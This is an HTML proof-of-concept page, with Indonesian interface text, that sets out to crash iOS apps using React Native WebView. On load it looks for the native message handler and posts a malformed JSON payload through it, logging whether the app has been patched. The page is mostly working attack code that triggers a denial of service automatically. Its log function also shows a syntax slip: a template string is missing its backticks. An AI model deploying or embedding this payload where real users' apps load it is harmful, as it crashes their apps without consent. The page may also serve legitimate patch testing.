<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PoC: ReactNativeWebView DoS Trigger</title>
    <style>
        body {
            background-color: #121212;
            color: #00ff00;
            font-family: 'Courier New', Courier, monospace;
            padding: 20px;
            line-height: 1.6;
        }
        .container {
            border: 1px solid #333;
            padding: 20px;
            border-radius: 8px;
            background-color: #1e1e1e;
        }
        h1 {
            color: #ffcc00;
            font-size: 1.5rem;
        }
        #status-box {
            background: #000;
            padding: 15px;
            border-left: 5px solid #ff0000;
            margin-top: 20px;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        .warning {
            color: #ff4444;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>Native Bridge Crash Tester</h1>
        <p class="warning">Peringatan: Menjalankan skrip ini pada aplikasi iOS yang rentan akan menyebabkan aplikasi crash seketika.</p>
        
        <div id="status-box">Menunggu inisialisasi...</div>
    </div>

    <script>
        const statusBox = document.getElementById("status-box");
        
        function log(msg) {
            const timestamp = new Date().toLocaleTimeString();
            statusBox.textContent += \n[${timestamp}] ${msg};
            console.log(msg);
        }

        function triggerCrash() {
            try {
                // Mengecek keberadaan handler native ReactNativeWebView (iOS)
                if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.ReactNativeWebView) {
                    log("Handler 'ReactNativeWebView' terdeteksi.");
                    
                    // Payload JSON tidak valid/cacat (Missing closing brace and quotes)
                    const malformedPayload = "{unclosed_json: 'crash_me'"; 
                    
                    log("Mengirim payload cacat ke native bridge...");
                    
                    // Mengirim pesan ke layer Native
                    window.webkit.messageHandlers.ReactNativeWebView.postMessage(malformedPayload);
                    
                    log("Payload terkirim: " + malformedPayload);
                    log("Jika aplikasi tidak crash, berarti sudah dipatch.");
                } else {
                    log("Error: Handler 'ReactNativeWebView' tidak ditemukan.");
                    log("Pastikan halaman ini dibuka di dalam React Native WebView pada perangkat iOS.");
                }
            } catch (err) {
                log("JavaScript Exception: " + err.message);
            }
        }

        // Jalankan trigger setelah delay singkat untuk memastikan bridge siap
        setTimeout(triggerCrash, 1500);
    </script>
</body>
</html>
